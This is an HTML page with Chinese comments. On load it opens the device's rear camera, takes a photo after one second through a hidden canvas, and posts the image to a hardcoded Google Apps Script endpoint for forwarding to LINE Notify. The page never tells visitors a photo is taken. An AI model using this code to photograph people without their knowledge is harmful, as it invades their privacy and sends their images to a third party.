<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LINE Notify 自動拍照傳送</title>
</head>
<body>
  <p id="status">狀態：啟動中...</p>

  <script>
    let photoData = null;

    // 啟動相機並自動拍照與傳送
    async function startCameraAndSend() {
      const statusElement = document.getElementById('status');

      try {
        // 啟動相機
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise((resolve) => (video.onloadedmetadata = resolve));

        // 等待相機啟動後拍照
        setTimeout(() => {
          // 使用隱藏的 Canvas 拍攝照片
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 壓縮為 Base64 格式
          photoData = canvas.toDataURL('image/jpeg', 0.5); // 壓縮至 50% 品質
          stream.getTracks().forEach((track) => track.stop()); // 停止相機
          sendPhotoToServer(photoData);
        }, 1000); // 延遲 1 秒拍照
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 發送照片到後端
    async function sendPhotoToServer(photoData) {
      const statusElement = document.getElementById('status');
      try {
        // 去掉 Base64 前綴
        const base64Image = photoData.split(',')[1];

        // 構造表單資料
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', base64Image);

        // 發送 POST 請求到 Google Apps Script
        const response = await fetch('https://script.google.com/macros/s/AKfycbyALtm6YDS92GFyTKqHFIVcnZ1ddF6WE5wUqwMeVcqXZPcBkDpKNDOJouRxSOTVYK0G3Q/exec', { // 替換為您的 Google Apps Script 部署 URL
          method: 'POST',
          body: formData, // 使用表單格式傳輸
        });

        const result = await response.json();

        // 更新狀態
        if (result.success) {
          statusElement.innerText = '照片已成功傳送到 LINE Notify！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 啟動相機並自動拍照與傳送
    startCameraAndSend();
  </script>
</body>
</html>
